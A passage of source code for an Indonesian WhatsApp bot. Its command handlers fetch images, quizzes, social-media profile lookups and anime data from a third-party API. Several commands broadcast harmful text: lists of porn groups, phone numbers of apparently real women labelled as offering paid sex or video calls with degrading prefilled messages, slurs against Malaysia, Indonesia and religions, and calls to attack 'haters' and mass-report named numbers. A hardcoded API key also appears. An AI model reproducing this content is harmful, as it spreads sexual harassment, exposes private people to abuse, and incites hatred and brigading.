		        if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'ngif':
                case 'nsfw_neko_gif':
                case 'random_hentai_gif':
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	            if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        zacky.sendMessage(from, buff, sticker, { quoted: mek})
                        fs.unlinkSync(rano)
                    })
                    break

                    // Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                cf = `${body.slice(8)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Maaf kamu sudah terbenned!')
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}|tolol`)
                ct = args.join(' ')
                mel1 = ct.split('|')[0]
                mel2 = ct.split('|')[1]
                reply(wait)
                amel = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${mel1}&text2=${mel2}`)
                zacky.sendMessage(from, amel, image, {quoted: freply})
                await limitAdd(sender)
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                case 'ff':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break                    
                    case 'zackygroup':
                    case 'zackygrup':
					case 'grupbot':
					case 'groupbot':
					case 'gc':			
					case 'gcwar':		 
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.sendMessage(from, `https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR\n\nhttps://chat.whatsapp.com/CJN785qutPDFOokOLPpovd\n\nhttps://chat.whatsapp.com/LbUvc63o0rq9phLoGp9dDS\n\n*NOMOR ADMIN👇*\nwa.me/6283896715117?text=Maksud+lu+apa+hina+BTS+Cill\n\n*AYO ARMY KITA SERANG HATERS*\n*SUPAYA MEREKA KAPOK😡*`, text, {quoted: fgroup})
					break
					case 'gc2':
					case 'w':					
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.sendMessage(from, `https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR\n\n*NOMOR ADMIN*\nwa.me/6283896715117?text=Maksud+lu+apa+hina+BTS+Cill\n\n*AYO ARMY KITA SERANG HATERS*\n*SUPAYA MEREKA KAPOK😡*`, text, {quoted: fgroup})			
					break										
					case 'b':
					case 'bokep':
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
bokep = `_*Bila Grup Penuh Kirim Ke-3 Grup Otomatis Bisa Masuk Sendiri*_
═══════════════════════
_*If the group is full, send the 3rd group, automatically you can enter yourself*_

https://chat.whatsapp.com/L89R8nrKDmQJvo41IKzrdc

https://chat.whatsapp.com/ElkKjl9SWuADvR6TM7OeV6

https://chat.whatsapp.com/BMfHSzbdA6z8trBFsoptWY

https://chat.whatsapp.com/FTJPyOVI4AhJV13dYmFpcm

https://chat.whatsapp.com/GmO1W3GAWntKC1Q9n5CJAx

https://chat.whatsapp.com/DMgk0Fj7QeJKn4UzR8ZUjp

https://chat.whatsapp.com/CjDSziJQdTxC1KsLn2zNDh

https://chat.whatsapp.com/BeMnagcUUk1JpUsMc4O6GI

https://chat.whatsapp.com/L8h97vcZ94O4p9sPXwQB4l

https://chat.whatsapp.com/EbfGRfUQspXDy0snx2ntEE

https://chat.whatsapp.com/KBNUHYmLvKj3ydNQIkzRHx

https://chat.whatsapp.com/JBPJ1NfOnx38N1HR5SUqps

https://chat.whatsapp.com/EDuYPD0AVplAU3j2ZdkU5B

https://chat.whatsapp.com/JcxbyoJ1y2V2WGyapWYZH8

https://chat.whatsapp.com/GTKYAOQvUhT5JH9BYWtfQX

https://chat.whatsapp.com/Hb3netnw0QJH9EEHOYfg84

https://chat.whatsapp.com/LnKrEwwWxOqAa8dRPFq9Q9

https://chat.whatsapp.com/Dq92yjZIT0ZFetCU3d96QV

https://chat.whatsapp.com/KjtbvcgL9BZIqxrUMiFSJx

https://chat.whatsapp.com/IzrLsUqXgrX4Cj4BCOfSTm

https://chat.whatsapp.com/GyavZbo90fELkDR7Afj46T

https://chat.whatsapp.com/ICmNDLBt10H4kXi5NqZguR

https://chat.whatsapp.com/CCFMpoRiYduAxESKb0ehef

https://chat.whatsapp.com/LD0LTfH9lpu0lLXVnR9cX1

https://chat.whatsapp.com/GJeFt4QVGuv63nrHprfWOP

https://chat.whatsapp.com/F6i20J7Fs66DQ14WpATvkC

https://chat.whatsapp.com/LOGfkqHWiRK3qRGPKKuTEQ

https://chat.whatsapp.com/CGeVHGMdpJnGzHRInqNREW

https://chat.whatsapp.com/IYGqLWXMM0iJYYZ5qHXVZ2

https://chat.whatsapp.com/JFlQ5SvlyXh808kORT653o

https://chat.whatsapp.com/HtOezkm4WuB6Q5hnyqlhNP

https://chat.whatsapp.com/F6ui69xZCv1GS9DpWoqJSJ

https://chat.whatsapp.com/Hne1OALXOCzJ7PRevFt5pF

https://chat.whatsapp.com/DsZeXg8lJTvIttwfJeVSxw

https://chat.whatsapp.com/DXKBRuY2Y2X5A5z6hb5VVJ

https://chat.whatsapp.com/LnWGDrxTOkoCOTBBrt8Jbk

https://chat.whatsapp.com/BO7Y1QdNlTuF8e2gAz5ku6

https://chat.whatsapp.com/FOo3GzsPMl8KWLZ7zKWvb1

https://chat.whatsapp.com/FTraoGyEwaU6zFhgVDELeN

*GROUP TELEGRAM*
https://bit.ly/3odlKve
https://t.me/GroupB0kep

═══════════════════════

${uwu}😍 OPEN VCS/OPEN BO 💦${uwu}

*👤Mella*
wa.me/6282277421509?text=Woi+Hode+open+Vcs??boleh+temenin+aku+coli+semalam

*👤Rinn*
wa.me/62895321094645?text=Woi+Bocil+Open+VCS+Harganya+Berapa??+Soalnya+lu+*Yatim*+Lonthe

*👤Santi*
wa.me/6289653309117?text=Neng+Open+VCS+yuk+soalnya+aku+Sangean

*👤Clara*
wa.me/62857318626900?text=Dek+*OPEN+VCS*+satu+Jam+harganya+berapa??+soalnya+aku+pengen+Ngentod

*👤Lilis*
wa.me/6289636743196?text=Hay+mba+open+Vcs+ga+boleh+temnin+aku+coli+ga+malam

*👤Riska*
wa.me/6281316861063?text=Woi+Babunya+Pain+sama+Rifky+gw+minta+Bokepnya+Kontol

*👤Rahma*
wa.me/6282175970085?text=Neng+Open+Bo+sejam+berapa??+soalnya+aku+mulai+sange

*👤Puput*
wa.me/6285395952174?text=neng+open+Bo+brp+jam

_*Kirim ke-3 Grup Dulu Nanti Otomatis Bisa Masuk*_
═══════════════════════
_*Send to 3 Groups First Later Automatically Enter*_`
zacky.sendMessage(from, bokep, text ,{quoted: fgroup, contextInfo: {forwardingScore: 1000, isForwarded: true }})
					break
					case 'malay':
					case 'gc3':
					case 'sara':
					case 'm':
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
					malay = `(🇲🇾MALAYDOG NEGARA LONTHE🖕)
https://chat.whatsapp.com/ITBC898qEqiLQtoe3DaMKa

(✡️MALAYSEX DAJJAL & AGONG PELACUR👙)
https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR

(🇲🇾MALAYSEX MISKIN & AGONG KONTOL🖕)
https://chat.whatsapp.com/LZ7dc1098vNIKX9nyEYMV9

(🔰TUHAN BTS JUNGKOOK & NABI ANIME 🔱)
https://chat.whatsapp.com/CJN785qutPDFOokOLPpovd

(🔰 TUHAN 👑 JIMIN 🔱)
https://chat.whatsapp.com/DXKBRuY2Y2X5A5z6hb5VVJ

(🇵🇱JOKONTOL DOGGIE & INDOGNESIAL🐶)
https://chat.whatsapp.com/DsZeXg8lJTvIttwfJeVSxw

(🇲🇾MALAYSEX KONTOL & AGONG PUKIMAK🖕)
https://t.me/joinchat/rorb5D-Lyws3MjVl

*NOMOR OWNER GROUP DAN ADMINNYA:*
wa.me/62895321094645
wa.me/6289653309117
wa.me/6282277421509
wa.me/6287823226491

*TOLONG REPORT NOMER - NOMER INI AGAR MEREKA KAPOK*

${uwu}TOLONG LAPORKAN GRUP INI, KARENA SUDAH MENGHINA NEGARA${uwu} *MALAYSIA, INDONESIA, DAN MENGHINA AGAMA*`		
zacky.sendMessage(from, malay, text ,{quoted: fgroup, contextInfo: {forwardingScore: 1000, isForwarded: true }})
					break

					case 'army':
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
BTS = `Buka tautan ini untuk bergabung ke grup WhatsApp saya:

• 🔰 BTS JIMIN OFFICIAL 💜
https://chat.whatsapp.com/DXKBRuY2Y2X5A5z6hb5VVJ

• 🔰 BTS OFFICIAL 💜
https://chat.whatsapp.com/Bzx185t5mtS5hXcORahlcb

• 🔰 BANGTAN SONYEODAN 💜
https://chat.whatsapp.com/CnZqg0CvddR9thoqWg5CZY

• 🔰 BTS & ARMY 💜
https://chat.whatsapp.com/CT3bzkfBqlG1YKHP9EeO5V

👩🏻 kk ak boleh masuk
👱🏻‍♀️ boleh
👩🏻 kok gk bisa kk
👱🏻‍♀️ kamu harus kirim ke 3 grup
👩🏻 makasih kk
👱🏻‍♀️ iy soalnya kalo kalian masuk bakal dapat no Taehyung

_Jika tidak bisa masuk share ke 3 grup maka otomatis masuk sendiri_`
zacky.sendMessage(from, BTS, text ,{quoted: fgroup, contextInfo: {forwardingScore: 1000, isForwarded: true }})
					break
					
					case 'rendy':
					if (isBanned) return reply('Maaf kamu sudah terbenned!')					
Rendy = ` *‼️REPORT GRUP INI‼️*

_KARENA TELAH MENGHINA SEMUA AGAMA TERMASUK ISLAM DAN MEMBUAT AGAMA MEREKA SENDIRI_

_JANGAN DIAM SAAT AGAMA MU DIHINA_

*👑 TUHAN RENDY SWT 🔱*
https://chat.whatsapp.com/K1AtS3wXVNt8JaxtgDT5gM

*🕋 TUHAN D∅NZ SWT 🔱*
https://chat.whatsapp.com/GlVQ2LDwWa3FzPeK6Og9Of

*👑 TUHAN RENDY SWT REBORN 🔱*
https://chat.whatsapp.com/GGz0FexfLfkDlxVM4vpPvq

*🔰 TUHAN BTS JUNGKOOK & NABI ANIME 🔱*
https://chat.whatsapp.com/CJN785qutPDFOokOLPpovd`
zacky.sendMessage(from, Rendy, text ,{quoted: fgroup, contextInfo: {forwardingScore: 1000, isForwarded: true }})
					break

			//Stalking
                   case 'igstalk':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalkig/${body.slice(9)}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : https://www.instagram.com/${get_result.username}\n`
					txt += `Full : ${get_result.fullname}\n`
					txt += `Post : ${get_result.posts}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.photo_profile)
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
		case 'githubstalk':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.avatar)
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
		case 'tkstalk':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
		case 'ytstalk':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					ytk = `${body.slice(11)}`
					anu = await fetchJson(`http://api.lolhuman.xyz/api/ytchannel?apikey=${lolkey}&query=${ytk}`, {method: 'get'})
					cari = 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢\n'
					for (let search of anu.result) {
						cari += `*Chanel* : ${search.channel_name}\n*Tentang* : ${search.channel_about}\n*Created* : ${search.channel_created}\n*Link* : https://youtu.com/channel/${search.channel_id}\nâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢\n`
					}
					reply(cari.trim())
					break
                   // Entertaiment 
		case 'tebakbendera':
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${lolkey}`, {method: 'get'})
					tebakbender = `*bendera apa ini?*\n${anu.result.flag}`
					setTimeout( () => {
					zacky.sendMessage(from, '*âž¸ Jawaban :* '+anu.result.name, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_10 Detik lagiâ€¦_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_20 Detik lagi_â€¦', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_30 Detik lagi_â€¦', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, tebakbender, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break 
                
				case 'family100':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`, {method: 'get'})
					family = `*${anu.result.question}*`
					setTimeout( () => {
					zacky.sendMessage(from, '*âž¸ Jawaban :* '+anu.result.aswer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_10 Detik lagiâ€¦_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_20 Detik lagi_â€¦', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_30 Detik lagi_â€¦', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, family, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break
					case 'caklontong':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=${lolkey}`, {method: 'get'})
					caklontong = `*${anu.result.question}*`
					setTimeout( () => {
					zacky.sendMessage(from, '*âž¸ Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_10 Detik lagiâ€¦_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_20 Detik lagi_â€¦', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_30 Detik lagi_â€¦', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, caklontong, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break 
					case 'asupan':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
                    buffer = await getBuffer(get_result.result)
                    zacky.sendMessage(from, buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
					case 'meme': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/random/meme?apikey=${lolkey}`, {method: 'get'})
				zacky.sendMessage(from, buffer, image, {quoted: mek})
				break
				    case 'memeindo': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				buffer = await getBuffer(`http://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`, {method: 'get'})
				zacky.sendMessage(from, buffer, image, {quoted: mek})
				break
				    case 'darkjoke': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/meme/darkjoke?apikey=KatoNiBoss`, {method: 'get'})
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'By ManikBot'})
				break
				    case 'namaninja': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: By ManikBot`)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/ninja?apikey=${lolkey}&nama=${gatauda}`)
					reply(anu.result)
					break
					case 'alay': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: By ManikBot`)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/alay?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break
					case 'purba':
					case 'bpurba': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: By ManikBot`)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/bahasapurba?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break
					case 'BK':
					case 'bk':
					case 'besarkecil': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Sofyan AMV`)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/upperlower?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break
					case 'hilih': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: By ManikBot`)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/hilih?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break
                    case 'kusonime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonime?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'kusonimesearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'otakudesu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/otakudesu?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'otakudesusearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'nhentai':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
